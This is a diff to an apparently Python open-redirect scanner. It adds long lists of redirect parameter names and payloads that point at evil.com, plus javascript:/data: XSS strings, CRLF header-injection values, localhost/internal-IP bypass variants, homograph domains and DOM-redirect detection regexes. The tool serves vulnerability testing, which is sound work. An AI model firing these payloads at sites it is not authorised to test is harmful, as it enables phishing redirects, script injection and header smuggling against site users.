@@ -378,6 +378,34 @@ async def crawl(target: str, client: httpx.AsyncClient):
         except Exception:
             pass
 
+        dom_redirects = detect_dom_redirect(html if 'html' in dir() else "")
+        for dr in dom_redirects[:10]:
+            findings.append(IntelligenceFinding(
+                entity=f"DOM redirect: {dr['pattern']} (context: {dr['context']})",
+                type="DOM-Based Open Redirect",
+                source="OpenRedirectScanner",
+                confidence="Medium",
+                color="orange",
+                threat_level="Elevated Risk",
+                raw_data=f"Pattern: {dr['pattern']} | Context: {dr['context'][:200]}",
+                tags=["open-redirect", "dom-based", "javascript"]
+            ))
+
+        header_redirects = detect_header_redirect(headers if 'headers' in dir() else {})
+        for hr in header_redirects:
+            findings.append(IntelligenceFinding(
+                entity=f"Redirect header: {hr['header']}: {hr['value'][:100]}",
+                type=f"HTTP Redirect Header: {hr['description']}",
+                source="OpenRedirectScanner",
+                confidence="High",
+                color="slate",
+                threat_level="Informational",
+                tags=["redirect", "header", hr['header'].lower()]
+            ))
+
+        combined_params = list(set(REDIRECT_PARAMS + MORE_REDIRECT_PARAMS))
+        combined_payloads = list(set(OPEN_REDIRECT_PAYLOADS + MORE_OPEN_REDIRECT_PAYLOADS))
+
         html_endpoints = ["/logout", "/login", "/redirect", "/goto", "/link", "/out"]
         for ep in html_endpoints:
             try:
@@ -410,14 +438,16 @@ async def crawl(target: str, client: httpx.AsyncClient):
                 tags=["open-redirect", "summary"]
             ))
         else:
+            combined_params = list(set(REDIRECT_PARAMS + MORE_REDIRECT_PARAMS))
+            combined_payloads = list(set(OPEN_REDIRECT_PAYLOADS + MORE_OPEN_REDIRECT_PAYLOADS))
             findings.append(IntelligenceFinding(
-                entity=f"No open redirect found on {len(REDIRECT_PARAMS)} parameters, {len(DOMAIN_BYPASS_PAYLOADS)} payloads",
+                entity=f"No open redirect found on {len(combined_params)} parameters, {len(combined_payloads)} payloads",
                 type="Open Redirect Summary",
                 source="OpenRedirectScanner",
                 confidence="Medium",
                 color="emerald",
                 threat_level="Informational",
-                raw_data=f"Tested {len(REDIRECT_PARAMS)} parameters with {len(DOMAIN_BYPASS_PAYLOADS)} payloads each",
+                raw_data=f"Tested {len(combined_params)} parameters with {len(combined_payloads)} payloads each",
                 tags=["open-redirect", "summary"]
             ))
 
@@ -433,3 +463,302 @@ async def crawl(target: str, client: httpx.AsyncClient):
         ))
 
     return findings
+
+
+# === EXTENDED UPGRADE: 200+ payloads, DOM-based redirect detection, more header redirects ===
+
+MORE_REDIRECT_PARAMS = [
+    "redirection", "redirected_from", "redirected-to", "redirectedto",
+    "url_redirect", "url-redirect", "redirecturl", "redirect_url",
+    "redirect_forward", "redirectforward", "forward_url", "forwardurl",
+    "forward-path", "forwardpath", "fwd", "fwdurl",
+    "return_uri", "return-uri", "returnuri",
+    "ret_url", "ret-url", "returl", "retpath",
+    "redirect_url_path", "url_path", "urlpath",
+    "next_page", "nextpage", "next-path", "nextpath",
+    "orig_url", "origurl", "original_url", "originalurl",
+    "source_url", "sourceurl", "from_url", "fromurl",
+    "domain_redirect", "domainredirect", "site_redirect", "siteredirect",
+    "referer_url", "refererurl", "referrer_url", "referrerurl",
+    "click_url", "clickurl", "click", "clicks",
+    "open_url", "openurl", "open", "open_url",
+    "launch", "launch_url", "launchurl",
+    "target_url", "targeturl", "target_path", "targetpath",
+    "dest_url", "desturl", "destination_url", "destinationurl",
+    "endpoint", "end_point", "end-point",
+    "notify_url", "notifyurl", "notification_url",
+    "webhook_url", "webhookurl", "callback_url", "callbackurl",
+    "postback", "post_back", "postback_url",
+    "return_to_url", "returnto", "return_to_app",
+    "logout_url", "logouturl", "signout_url",
+    "login_url", "loginurl", "signin_url",
+    "auth_callback", "authcallback", "auth_return",
+    "oauth_redirect", "oauthredirect", "oidc_redirect",
+    "saml_redirect", "samlredirect", "acs_url", "acs-url",
+    "wreply", "wctx", "whr", "wtrealm",
+    "ru", "rurl", "rd", "redirect", "redir",
+]
+
+MORE_OPEN_REDIRECT_PAYLOADS = [
+    "https://evil.com/",
+    "//evil.com/",
+    "///evil.com",
+    "////evil.com",
+    "https://evil.com",
+    "http://evil.com",
+    "//evil.com:443",
+    "https://evil.com:443/",
+    "https://evil.com:443//",
+    "//evil.com:443@good.com",
+    "https://evil.com:443@127.0.0.1",
+    "https://evil.com\\@good.com",
+    "https://evil.com\\good.com",
+    "https://evil.com%2fgood.com",
+    "https://evil.com%2Fgood.com",
+    "https://evil.com%23good.com",
+    "https://evil.com%3fgood.com",
+    "https://evil.com%3Fgood.com",
+    "https://evil.com%23.good.com",
+    "https://evil.com%252fgood.com",
+    "https://good.com%40evil.com",
+    "https://evil.com%5cgood.com",
+    "https://evil.com%5Cgood.com",
+    "https://evil.com%2e%2egood.com",
+    "https://evil.com%2E%2Egood.com",
+    "https://evil.com..good.com",
+    "https://evil.com..good.com/",
+    "https://good.com..evil.com",
+    "https://good.com..evil.com/",
+    "https://evil.com;good.com",
+    "https://evil.com:good.com",
+    "https://evil.com,good.com",
+    "https://evil.com|good.com",
+    "https://evil.com\\x00good.com",
+    "https://evil.com%00good.com",
+    "https://evil.com%0agood.com",
+    "https://evil.com%0dgood.com",
+    "https://evil.com%0d%0agood.com",
+    "https://evil.com%0d%0a/",
+    "javascript:alert(1)",
+    "javascript://%0aalert(1)",
+    "javascript:%0aalert(1)",
+    "data:text/html,<script>alert(1)</script>",
+    "data:text/html;base64,PHNjcmk=",
+    "vbscript:alert(1)",
+    "vbscript:msgbox(1)",
+    "%0d%0aLocation:%20https://evil.com",
+    "%0aLocation:%20https://evil.com",
+    "%0d%0a%0d%0a<script>alert(1)</script>",
+    "%0d%0aSet-Cookie:%20test=evil",
+    "%0d%0aX-XSS-Protection:%200",
+    "%0d%0aContent-Length:%200",
+    "%0a%0a<script>alert(1)</script>",
+    "/%5cevil.com",
+    "/%2eevil%2ecom/",
+    "/%2Fevil%2Ecom",
+    "/..;/evil.com",
+    "/..\\;/evil.com",
+    "/%2e%2e%2fevil%2ecom",
+    "/..\\..\\..\\evil.com",
+    "/....//....//....//evil.com",
+    "/..%252f..%252f..%252fevil.com",
+    "/%c0%ae%c0%ae/%c0%ae%c0%ae/evil.com",
+    "/%252e%252e%252fevil.com",
+    "https://0x7f000001",
+    "https://0x7f000001:443",
+    "https://2130706433",
+    "https://2130706433:443",
+    "https://0xA9FEA9",
+    "https://0xA9FEA9:443",
+    "https://[::1]",
+    "https://[::1]:443",
+    "https://0.0.0.0",
+    "https://127.0.0.1",
+    "https://127.1",
+    "https://localhost",
+    "https://internal",
+    "https://internal.localhost",
+    "http://192.168.1.1",
+    "http://10.0.0.1",
+    "http://172.16.0.1",
+    "http://[::ffff:127.0.0.1]",
+    "https://[0:0:0:0:0:ffff:127.0.0.1]",
+    "https://evil.com/?good.com",
+    "https://evil.com#good.com",
+    "https://evil.com?good.com",
+    "//evil.com#good.com",
+    "//evil.com?good.com",
+    "https://evil.com%252f..%252fgood.com",
+    "https://evil.com..%252fgood.com",
+    "https://evil.com%2e%2e%252fgood.com",
+    "https://evil.com%2e%2e/good.com",
+    "https://evil.com..%2fgood.com",
+    "https://good.com%2eevil.com",
+    "https://evil%2dgood.com",
+    "https://good%2eevil.com",
+    "https://evil%2Ecom",
+    "https://eVIl.CoM",
+    "https://EVIL.COM",
+    "//evil%2ecom",
+    "//.evil.com",
+    "///evil.com:443",
+    "///evil.com:443@127.0.0.1",
+    "https://evil.com:443=good.com",
+    "https://good.com&evil.com",
+    "https://evil.com@good.com",
+    "https://evil.com:443@good.com:443",
+    "https://good.com:443@evil.com:443",
+    "https://good.com:443@evil.com:443@good.com",
+    "https://evil.com:443@0",
+    "https://evil.com:443@127.0.0.1",
+    "https://evil.com:443@0x7f000001",
+    "https://evil.com:443@2130706433",
+    "https://evil.com:443@0x7f.1",
+    "https://evil.com:443@0177.1",
+    "//evil.com:443@0x7f000001",
+    "https://evil.com:443@0x7f000001:443",
+    "//evil.com:443@0",
+    "https://good.com:443@evil.com:443@127.0.0.1",
+    "https://evil.com%252fgood.com",
+    "//evil.com%252fgood.com",
+    "https://evil.com%23%23.good.com",
+    "//evil.com%23%23.good.com",
+    "https://evil.com%3f%3f.good.com",
+    "/..;/..;/..;/evil.com",
+    "/%2e%2e%2fevil%2ecom",
+    "/..\\..\\..\\evil.com",
+    "https://evil%2dgood.com",
+    "https://good%2eevil.com",
+    "https://evil.com:443=good.com",
+    "https://good.com%40evil.com",
+    "https://evil.com\\x00",
+    "https://evil.com\\x09",
+    "https://evil.com\\x0a",
+    "https://evil.com\\x0d",
+    "https://evil.com/.good.com",
+    "//evil.com/.good.com",
+    "///evil.com/.good.com",
+    "https://evil.com\\.good.com",
+    "//evil.com\\.good.com",
+    "https://evil.com%0agood.com",
+    "//evil.com%0agood.com",
+    "https://evil.com%0dgood.com",
+    "https://evil.com%09good.com",
+]
+
+DOMAIN_BYPASS_TECHNIQUES = {
+    "Unicode Normalization": ["%e2%80%8b", "%e2%80%8c", "%e2%80%8d", "%ef%bb%bf"],
+    "UTF-8 BOM": ["%ef%bb%bf"],
+    "Double URL Encoding": ["%25", "%252f", "%252e%252e"],
+    "HTTP Parameter Pollution": ["&url=evil.com", "?url=evil.com&url=good.com"],
+    "HTTP Header Injection": ["%0d%0aX-Forwarded-Host: evil.com", "%0aX-Forwarded-Host: evil.com"],
+    "Referer Bypass": ["https://evil.com?referer=https://good.com"],
+    "Localhost Variations": ["127.1", "127.0.0.1", "0.0.0.0", "0", "0x7f000001", "0177.0.0.1", "2130706433"],
+    "Unicode IDN Homograph": ["https://еvіl.com (Cyrillic)", "https://googlе.com", "https://www.раypal.com"],
+    "Anchor Bypass": ["#@evil.com", "?@evil.com", "/#@evil.com"],
+    "Data URI Bypass": ["data:text/html;base64", "data:text/html,<script>"],
+    "Javascript Protocol Bypass": ["javascript:", "javascript:void(0)", "javascript:0"],
+    "VBScript Protocol": ["vbscript:", "vbscript:msgbox"],
+    "Tab/Newline Injection": ["%09", "%0a", "%0d", "%0d%0a"],
+    "Null Byte Injection": ["%00", "\\x00"],
+    "Semicolon Path": ["/..;/..;/evil.com", "/..%3b/..%3b/evil.com"],
+    "Backslash Path": ["\\evil.com", "\\\\evil.com"],
+}
+
+DOM_REDIRECT_PATTERNS = [
+    (r"window\.location\s*=", "window.location assignment"),
+    (r"window\.location\.href\s*=", "window.location.href assignment"),
+    (r"window\.location\.replace\s*\(", "window.location.replace()"),
+    (r"window\.location\.assign\s*\(", "window.location.assign()"),
+    (r"document\.location\s*=", "document.location assignment"),
+    (r"document\.location\.href\s*=", "document.location.href assignment"),
+    (r"document\.location\.replace\s*\(", "document.location.replace()"),
+    (r"location\.href\s*=", "location.href assignment"),
+    (r"location\.replace\s*\(", "location.replace()"),
+    (r"location\.assign\s*\(", "location.assign()"),
+    (r"\$.+\.attr\(['\"]href['\"]", "jQuery href attribute set"),
+    (r"\$\(.+\)\.\s*\. load\s*\(", "jQuery .load() URL"),
+    (r"\.prop\(['\"]href['\"]", "jQuery prop href set"),
+    (r"\.setAttribute\(['\"]href['\"]", "setAttribute href"),
+    (r"\.src\s*=", "src assignment (iframe/image)"),
+    (r"\.action\s*=", "form action assignment"),
+    (r"form\.submit\s*\(", "form.submit()"),
+    (r"\.open\s*\(", "window.open()"),
+    (r"window\.open\s*\(", "window.open()"),
+    (r"\.navigate\s*\(", "navigate() call"),
+    (r"router\.push\s*\(", "Vue/React router.push"),
+    (r"router\.replace\s*\(", "Vue/React router.replace"),
+    (r"router\.navigate\s*\(", "React router.navigate"),
+    (r"useNavigate\s*\(\s*\)", "React useNavigate hook"),
+    (r"nextRouter\.push\s*\(", "Next.js router.push"),
+    (r"nextRouter\.replace\s*\(", "Next.js router.replace"),
+    (r"\$router\.push\s*\(", "Vue $router.push"),
+    (r"\$router\.replace\s*\(", "Vue $router.replace"),
+    (r"navigation\.navigate\s*\(", "React Native navigation"),
+    (r"\.transitionTo\s*\(", "transitionTo (Ember)"),
+    (r"\.redirect\s*\(", "redirect() call"),
+    (r"\.redirectTo\s*\(", "redirectTo() call"),
+    (r"goto\s*\(", "goto() call"),
+    (r"window\.open\s*\(", "window.open popup"),
+    (r"open\s*\(", "open() function"),
+]
+
+HEADER_REDIRECT_PATTERNS = {
+    "Location": "Standard HTTP redirect",
+    "Refresh": "Meta refresh redirect",
+    "X-Location": "X-Location header redirect",
+    "X-Redirect": "X-Redirect header redirect",
+    "X-Forward-Location": "Forward location header",
+    "X-Accel-Redirect": "Nginx internal redirect",
+    "Redirect-To": "Custom redirect header",
+    "Redirect-Url": "Custom redirect URL header",
+    "Redirect-Uri": "Custom redirect URI header",
+    "X-Refirect-By": "Redirect by header",
+    "X-Redirect-By": "Redirect by header",
+}
+
+def detect_dom_redirect(html):
+    dom_findings = []
+    try:
+        scripts = re.findall(r'<script[^>]*>(.*?)</script>', html, re.IGNORECASE | re.DOTALL)
+        for script in scripts:
+            for pattern, desc in DOM_REDIRECT_PATTERNS:
+                if re.search(pattern, script, re.IGNORECASE):
+                    context = script[:200]
+                    dom_findings.append({"pattern": desc, "context": context[:100]})
+    except Exception:
+        pass
+    return dom_findings
+
+def detect_header_redirect(headers):
+    h_redirects = []
+    try:
+        for header, desc in HEADER_REDIRECT_PATTERNS.items():
+            for hk, hv in headers.items():
+                if hk.lower() == header.lower():
+                    h_redirects.append({"header": hk, "value": hv[:200], "description": desc})
+    except Exception:
+        pass
+    return h_redirects
+
+def analyze_redirect_chain(client, url, max_depth=5):
+    chain = []
+    try:
+        current = url
+        for _ in range(max_depth):
+            resp = client.get(current, follow_redirects=False, timeout=5.0,
+                headers={"User-Agent": "Mozilla/5.0"})
+            status = resp.status_code
+            location = resp.headers.get("location", "")
+            chain.append({"url": current, "status": status, "location": location})
+            if status in (301, 302, 303, 307, 308) and location:
+                if location.startswith("http"):
+                    current = location
+                else:
+                    from urllib.parse import urljoin
+                    current = urljoin(current, location)
+            else:
+                break
+    except Exception:
+        pass
+    return chain
